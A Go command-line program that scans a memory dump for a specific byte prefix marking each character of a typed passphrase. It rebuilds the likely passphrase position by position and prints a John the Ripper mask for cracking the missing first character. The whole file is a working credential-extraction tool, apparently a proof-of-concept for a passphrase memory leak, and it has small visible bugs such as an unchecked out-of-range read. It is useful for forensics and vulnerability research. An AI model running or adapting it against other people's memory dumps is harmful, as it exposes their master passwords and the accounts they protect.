package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"unicode"
	"unicode/utf8"
)

var (
	argMemDump = flag.String("d", "", "Path to the memory dump")
)

func main() {

	flag.Parse()
	if *argMemDump == "" {
		flag.Usage()
		os.Exit(1)
	}

	fd, err := os.Open(*argMemDump)
	if err != nil {
		log.Fatal(err)
	}

	data, err := io.ReadAll(fd)
	if err != nil {
		log.Fatal(err)
	}

	// Passphrases appear in memory prefxied with 0xCF 0x25
	// the number of prefixes denotes the possible character position.
	//
	// 0xCF 0x25 0x61 would denote an 'a' in position 1
	// 0xCF 0x25 0xCF 0x25 0x62 would denote an 'b' in position 2
	//
	// The first character of the passphrase is never available.
	// There may be multiple characters for any given position

	// prefixCount is a running total of the number of sequential prefixes
	prefixCount := 0

	// maxPrefixCount is used to track the max length of the passphrase
	// this is used later on to account for positions without any characters found
	maxPrefixCount := 0

	// chars key is the character position (prefixCount) and a map of runes.
	// duplicate characters for each position can occur, so a map of runes helps limit to one instance of the character.
	chars := make(map[int]map[rune]struct{})

	for i := 0; i < len(data); i++ {

		// detecting the prefix sequence
		if data[i] == 0xCF && data[i+1] == 0x25 {
			prefixCount++
			i++
			continue
		}
		// this suggests there has been a prefix, and the current byte part of a character
		if prefixCount > 0 {
			r, size := utf8.DecodeRune(data[i:])

			// the prefix sequence occurs a lot and there can be invalid characters
			if unicode.IsPrint(r) {
				if _, ok := chars[prefixCount]; !ok {
					chars[prefixCount] = map[rune]struct{}{}
				}
				chars[prefixCount][r] = struct{}{}
			}
			i += size - 1
			if prefixCount > maxPrefixCount {
				maxPrefixCount = prefixCount
			}
			prefixCount = 0
		}
	}

	printCharsByPosition(chars, maxPrefixCount)
	printPossiblePassword(chars, maxPrefixCount)
	printJTRMask(chars, maxPrefixCount)

}

func printCharsByPosition(chars map[int]map[rune]struct{}, maxPrefixCount int) {

	fmt.Println("Possible characters by position")

	// the first character is never known.
	fmt.Printf("00: {UNKNOWN}")
	for i := 1; i <= maxPrefixCount-1; i++ {
		fmt.Printf("\n%02d: ", i)
		if v, ok := chars[i]; ok {
			for c, _ := range v {
				if c == 0xfffd {
					fmt.Printf("{UNKNOWN}")
					continue
				}
				fmt.Printf("%c", c)
			}
			continue
		}
		fmt.Println("{UNKNOWN}")
	}
	fmt.Println()
	fmt.Println()
}

func printPossiblePassword(chars map[int]map[rune]struct{}, maxPrefixCount int) {

	fmt.Printf("Possible passphrase:\n")

	// The first character is never known.
	fmt.Printf("%c", 0xfffd)
	for i := 1; i <= maxPrefixCount-1; i++ {
		if v, ok := chars[i]; ok {
			curChars := []rune{}
			for c := range v {
				curChars = append(curChars, c)
			}
			if len(curChars) == 1 {
				fmt.Printf("%c", curChars[0])
				continue
			}
			if len(curChars) > 5 {
				fmt.Printf("%c", 0xfffd)
				continue
			}
			fmt.Printf("{%c", curChars[0])
			for j := 1; j < len(curChars); j++ {
				fmt.Printf(",%c", curChars[j])
			}
			fmt.Printf("}")

		}
	}
	fmt.Println()
	fmt.Println()
}

func printJTRMask(chars map[int]map[rune]struct{}, maxPrefixCount int) {

	fmt.Println("John the ripper mask:")

	// The first character is never known
	fmt.Printf("?a")
	for i := 0; i < maxPrefixCount; i++ {
		if v, ok := chars[i]; ok {
			curChars := []rune{}
			for c := range v {
				curChars = append(curChars, c)
			}
			if len(curChars) == 1 {
				if curChars[0] == 0xfffd {
					fmt.Printf("?a")
					continue
				}
				fmt.Printf("%c", curChars[0])
				continue
			}
			if len(curChars) > 5 {
				fmt.Printf("?a")
				continue
			}
			fmt.Printf("[%s]", string(curChars))
		}
	}
	fmt.Println()
}
